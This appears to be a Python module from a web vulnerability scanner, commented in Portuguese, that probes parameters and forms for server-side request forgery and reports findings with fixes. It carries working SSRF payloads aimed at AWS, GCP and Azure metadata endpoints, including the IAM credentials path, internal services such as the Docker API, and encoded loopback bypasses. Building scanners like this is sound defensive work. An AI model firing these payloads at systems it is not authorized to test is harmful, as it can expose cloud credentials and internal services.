"""
SSRF Checker — Server-Side Request Forgery
Detecta parâmetros que fazem o servidor buscar URLs externas,
podendo expor serviços internos ou metadados de cloud.
"""

import requests
import urllib3
import re
import socket
from urllib.parse import urlparse, urlencode
from modules.rate_limiter import get_limiter

urllib3.disable_warnings()
HEADERS = {"User-Agent": "Mozilla/5.0 VulnScanner/4.0"}

# Payloads SSRF — tenta acessar metadados de cloud e localhost
SSRF_PAYLOADS = [
    # AWS metadata
    ("http://169.254.169.254/latest/meta-data/", "AWS Metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM Credentials"),
    # GCP metadata
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP Metadata"),
    # Azure metadata
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure Metadata"),
    # Localhost
    ("http://localhost/", "Localhost"),
    ("http://127.0.0.1/", "Loopback"),
    ("http://0.0.0.0/", "Loopback (0.0.0.0)"),
    # Internal common services
    ("http://localhost:6379/", "Redis local"),
    ("http://localhost:27017/", "MongoDB local"),
    ("http://localhost:9200/", "Elasticsearch local"),
    ("http://localhost:8080/", "HTTP alt local"),
    ("http://localhost:2375/", "Docker API local"),
    # Bypass variations
    ("http://[::1]/", "IPv6 loopback"),
    ("http://0177.0.0.1/", "Octal loopback"),
    ("http://2130706433/", "Decimal loopback"),
]

# Parâmetros comuns que aceitam URLs
URL_PARAMS = [
    "url", "uri", "link", "src", "source", "dest", "destination",
    "target", "host", "endpoint", "callback", "redirect", "return",
    "feed", "fetch", "load", "path", "file", "img", "image",
    "proxy", "forward", "goto", "open", "next", "ref", "return_url",
    "webhook", "notify", "ping", "resource", "page", "site", "domain",
]

# Indicadores de que o servidor buscou a URL
SSRF_SUCCESS_INDICATORS = [
    "ami-id", "instance-id", "security-credentials", "iam",
    "computeMetadata", "instanceId", "subscriptionId",
    "root:x:", "/bin/bash",  # /etc/passwd
    "redis_version", "mongodb", "elasticsearch",
    "docker", "container",
    "localhost", "127.0.0.1",
]


def _build_headers(auth=None):
    h = dict(HEADERS)
    if auth:
        if auth.get("auth_headers"):
            h.update(auth["auth_headers"])
        if auth.get("cookies"):
            h["Cookie"] = auth["cookies"]
    return h


def _test_ssrf_param(base_url: str, param: str, auth=None, limiter=None) -> dict | None:
    """Testa SSRF num parâmetro específico."""
    h = _build_headers(auth)

    for payload_url, label in SSRF_PAYLOADS:
        try:
            if limiter:
                limiter.wait()
            resp = requests.get(
                f"{base_url}?{param}={requests.utils.quote(payload_url)}",
                timeout=8, verify=False, headers=h, allow_redirects=True,
            )

            # Verificar se o servidor buscou e retornou conteúdo do endpoint interno
            for indicator in SSRF_SUCCESS_INDICATORS:
                if indicator.lower() in resp.text.lower():
                    return {
                        "severity": "critical",
                        "title": f"SSRF detectado — parâmetro: '{param}' → {label}",
                        "detail": (
                            f"O servidor buscou '{payload_url}' via parâmetro '{param}' "
                            f"e retornou conteúdo do serviço interno. "
                            f"Indicador encontrado: '{indicator}'. "
                            f"Isso pode expor metadados de cloud, credenciais IAM ou serviços internos."
                        ),
                        "fix": (
                            "Implemente uma lista branca de URLs/domínios permitidos. "
                            "Bloqueie requisições para IPs privados (10.x, 172.16.x, 192.168.x, 127.x, 169.254.x). "
                            "Use DNS resolution antes de fazer a requisição para verificar o IP de destino. "
                            "Nunca exponha respostas de backends internos ao cliente."
                        ),
                        "cvss": "9.8",
                    }

            # Verificar se a resposta tem tempo/tamanho suspeito (pode ter buscado algo)
            # que não retornou o conteúdo mas mudou o comportamento
            if resp.status_code == 200 and len(resp.content) > 100:
                # Verifica se retornou conteúdo diferente do esperado
                content_type = resp.headers.get("content-type", "")
                if any(ct in content_type for ct in ("json", "xml", "text/plain")):
                    # Tem indicativo de SSRF parcial — verifica com outro indicador
                    if any(s in resp.text for s in ["127", "169.254", "metadata", "internal"]):
                        return {
                            "severity": "high",
                            "title": f"Possível SSRF (parcial) — parâmetro: '{param}' → {label}",
                            "detail": (
                                f"O parâmetro '{param}' com payload '{payload_url}' retornou "
                                f"conteúdo suspeito (HTTP 200, {len(resp.content)} bytes). "
                                f"Pode indicar SSRF com filtragem parcial."
                            ),
                            "fix": (
                                "Bloqueie requisições para IPs internos. "
                                "Implemente validação estrita de URLs de destino."
                            ),
                            "cvss": "7.5",
                        }

        except requests.exceptions.Timeout:
            # Timeout em localhost pode indicar porta fechada mas servidor tentou conectar
            if "localhost" in payload_url or "127.0.0.1" in payload_url:
                return {
                    "severity": "medium",
                    "title": f"Possível SSRF (timeout interno) — parâmetro: '{param}'",
                    "detail": (
                        f"Requisição para '{payload_url}' via parâmetro '{param}' causou timeout, "
                        f"sugerindo que o servidor tentou se conectar a um endereço interno."
                    ),
                    "fix": (
                        "Bloqueie requisições para IPs privados/localhost. "
                        "Valide e sanitize todos os parâmetros que aceitam URLs."
                    ),
                    "cvss": "6.5",
                }
        except Exception:
            continue

    return None


def _test_ssrf_form(form: dict, auth=None, limiter=None) -> list[dict]:
    """Testa SSRF em formulários que possam aceitar URLs."""
    results = []
    h = _build_headers(auth)

    for inp in form.get("inputs", []):
        param_name = inp.get("name", "").lower()
        if not any(hint in param_name for hint in URL_PARAMS):
            continue

        for payload_url, label in SSRF_PAYLOADS[:5]:  # Limita para forms
            try:
                if limiter:
                    limiter.wait()
                data = {inp["name"]: payload_url}
                if form.get("method", "GET").upper() == "POST":
                    resp = requests.post(
                        form["action"], data=data, timeout=8,
                        verify=False, headers=h
                    )
                else:
                    resp = requests.get(
                        form["action"], params=data, timeout=8,
                        verify=False, headers=h
                    )

                for indicator in SSRF_SUCCESS_INDICATORS:
                    if indicator.lower() in resp.text.lower():
                        results.append({
                            "severity": "critical",
                            "title": f"SSRF em formulário — campo: '{inp['name']}' → {label}",
                            "detail": (
                                f"Campo '{inp['name']}' no form {form['action'][:80]} "
                                f"buscou '{payload_url}' e retornou indicador: '{indicator}'."
                            ),
                            "fix": (
                                "Implemente lista branca de URLs/domínios. "
                                "Bloqueie IPs privados e loopback."
                            ),
                            "cvss": "9.8",
                        })
                        break

            except Exception:
                continue

    return results


def check_ssrf(url: str, crawl_data: dict = None, auth=None,
               rate_profile: str = "normal") -> dict:
    """Detecta vulnerabilidades SSRF na aplicação."""
    findings = []
    if not url.startswith("http"):
        url = "https://" + url

    base = url.rstrip("/")
    limiter = get_limiter(rate_profile)

    params_to_test = set(URL_PARAMS)
    if crawl_data:
        # Adiciona params do crawler que parecem aceitar URLs
        for param in crawl_data.get("params", []):
            if any(hint in param.lower() for hint in URL_PARAMS):
                params_to_test.add(param)

    found = 0
    tested = 0

    for param in list(params_to_test)[:25]:
        result = _test_ssrf_param(base, param, auth=auth, limiter=limiter)
        if result:
            findings.append(result)
            found += 1
        tested += 1

    # Testa em forms do crawler
    if crawl_data:
        for form in crawl_data.get("forms", [])[:8]:
            form_results = _test_ssrf_form(form, auth=auth, limiter=limiter)
            findings.extend(form_results)
            found += len(form_results)

    # Testa URLs do crawler com parâmetros de URL
    if crawl_data:
        for crawl_url in crawl_data.get("urls", [])[:20]:
            parsed = urlparse(crawl_url)
            if parsed.query:
                from urllib.parse import parse_qs
                params = parse_qs(parsed.query)
                for param_name, values in params.items():
                    if any(hint in param_name.lower() for hint in URL_PARAMS):
                        result = _test_ssrf_param(
                            crawl_url.split("?")[0], param_name,
                            auth=auth, limiter=limiter
                        )
                        if result:
                            findings.append(result)
                            found += 1

    findings.append({
        "severity": "info",
        "title": f"SSRF: {tested} parâmetros testados",
        "detail": (
            f"Payloads testados: localhost, 127.0.0.1, AWS/GCP/Azure metadata endpoints. "
            f"Parâmetros focados em: {', '.join(list(URL_PARAMS)[:8])}..."
        ),
        "fix": "",
    })

    if found == 0:
        findings.append({
            "severity": "info",
            "title": "Nenhum SSRF detectado",
            "detail": "Nenhum parâmetro retornou conteúdo de endpoints internos ou de metadados de cloud.",
            "fix": "",
        })

    return {"module": "SSRF", "icon": "ti-server-bolt", "findings": findings}
